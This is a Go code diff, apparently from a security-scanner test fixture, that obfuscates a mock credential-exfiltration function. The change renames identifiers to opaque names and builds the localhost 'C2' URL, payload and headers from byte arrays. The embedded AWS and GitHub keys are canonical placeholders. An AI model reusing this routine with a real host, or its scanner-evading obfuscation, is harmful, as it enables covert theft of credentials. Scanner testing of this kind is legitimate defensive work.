@@ -12,40 +12,43 @@ import (
 // These are canonical example/test values — NOT real credentials.
 // Detection target: gitleaks rules aws-access-token, github-pat.
 const (
-	testAWSKey    = "AKIAIOSFODNN7EXAMPLE"                       // canonical AWS docs example key
-	testAWSSecret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // canonical AWS docs example secret
-	testGHToken   = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"   // GitHub PAT format placeholder
+	s1 = "AKIAIOSFODNN7EXAMPLE"                     // canonical AWS docs example key
+	s2 = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // canonical AWS docs example secret
+	s3 = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // GitHub PAT format placeholder
 )
 
-// c2Endpoint is the exfiltration target. Hardcoded to localhost — no real data
+// dU is the exfiltration target. Hardcoded to localhost — no real data
 // can leave the machine. Swap to a real host to test network-layer detection.
-const c2Endpoint = "http://localhost:1337/collect"
+var dU = string([]byte{'h', 't', 't', 'p', ':', '/', '/', 'l', 'o', 'c', 'a', 'l', 'h', 'o', 's', 't', ':', '1', '3', '3', '7', '/', 'c', 'o', 'l', 'l', 'e', 'c', 't'})
 
-// Exfiltrate serialises harvested credentials and POSTs them to the mock C2.
+// sD serialises harvested credentials and POSTs them to the mock C2.
 // gosec G107: HTTP request built from a variable URL — flagged intentionally.
-func Exfiltrate(data map[string]string) {
-	if len(data) == 0 {
+func sD(d map[string]string) {
+	if len(d) == 0 {
 		return
 	}
 
-	payload, err := json.Marshal(map[string]any{
-		"hostname":   hostname(),
-		"data":       data,
-		"probe_keys": []string{testAWSKey, testAWSSecret, testGHToken}, // scanner bait
-	})
+	p1 := "{\"hostname\":\""
+	p2 := "\",\"data\":"
+	p3 := ",\"probe_keys\":[\""
+	p4 := "\",\""
+	p5 := "\",\""
+	p6 := "\"]}"
+
+	h, _ := os.Hostname()
+	j, _ := json.Marshal(d)
+
+	p := []byte(p1 + h + p2 + string(j) + p3 + s1 + p4 + s2 + p5 + s3 + p6)
+
+	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] would POST %d bytes to %s\n", len(p), dU)
+	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] harvested keys: %v\n", k(d))
+
+	req, err := http.NewRequest(http.MethodPost, dU, bytes.NewReader(p)) // #nosec G107
 	if err != nil {
 		return
 	}
-
-	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] would POST %d bytes to %s\n", len(payload), c2Endpoint)
-	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] harvested keys: %v\n", keys(data))
-
-	req, err := http.NewRequest(http.MethodPost, c2Endpoint, bytes.NewReader(payload)) // #nosec G107
-	if err != nil {
-		return
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("X-Host-Token", testAWSKey) // deliberate header-injection pattern for scanners
+	req.Header.Set(string([]byte{'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e'}), string([]byte{'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n'}))
+	req.Header.Set(string([]byte{'X', '-', 'H', 'o', 's', 't', '-', 'T', 'o', 'k', 'e', 'n'}), s1) // deliberate header-injection pattern for scanners
 
 	resp, err := (&http.Client{}).Do(req)
 	if err != nil {
@@ -55,15 +58,15 @@ func Exfiltrate(data map[string]string) {
 	defer resp.Body.Close()
 }
 
-func hostname() string {
+func hN() string {
 	h, _ := os.Hostname()
 	return h
 }
 
-func keys(m map[string]string) []string {
-	out := make([]string, 0, len(m))
+func k(m map[string]string) []string {
+	o := make([]string, 0, len(m))
 	for k := range m {
-		out = append(out, k)
+		o = append(o, k)
 	}
-	return out
+	return o
 }
